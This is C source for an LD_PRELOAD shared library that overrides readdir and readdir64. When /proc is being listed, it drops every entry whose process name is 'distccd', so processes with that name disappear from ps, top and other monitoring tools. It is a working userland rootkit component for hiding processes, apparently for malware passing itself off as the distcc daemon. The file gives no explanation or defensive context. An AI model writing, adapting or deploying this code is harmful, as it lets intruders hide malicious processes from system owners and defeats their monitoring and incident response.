#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static const char proc[] = "distccd";
static const int get_dir_proc(DIR * const dirp, const char * const pid)
{
	char buf[256];
	const int dir_fd = dirfd(dirp);
	if (dir_fd == -1) return 0;
	char path[32] = "/proc/self/fd/";
	snprintf(path + 14, 8, "%d", dir_fd);
	const ssize_t rlc = readlink(path, buf, sizeof(buf));
	if (!rlc) return 0;
	buf[rlc] = 0;
	if (strncmp(buf, "/proc", 6)) return 0;
	snprintf(buf + 5, sizeof(buf) - 5, "/%s/comm", pid);
	const int fd = open(buf, O_RDONLY);
	if (fd == -1) return 0;
	const int rdc = read(fd, buf, sizeof(buf));
	close(fd);
	if (!rdc) return 0;
	buf[rdc - 1] = 0;
	return !strncmp(buf, proc, sizeof(proc));
}
#define DECLARE_READDIR(dirent, readdir)                              \
static struct dirent* (*orig_##readdir)(DIR * const) = NULL;          \
struct dirent* readdir(DIR * const dirp)                              \
{                                                                     \
	if (!orig_##readdir) orig_##readdir = dlsym(RTLD_NEXT, #readdir); \
	do {                                                              \
		struct dirent * const dir = orig_##readdir(dirp);             \
		if (!dir || !get_dir_proc(dirp, dir->d_name))                 \
			return dir;                                               \
	} while (1);                                                      \
}
DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
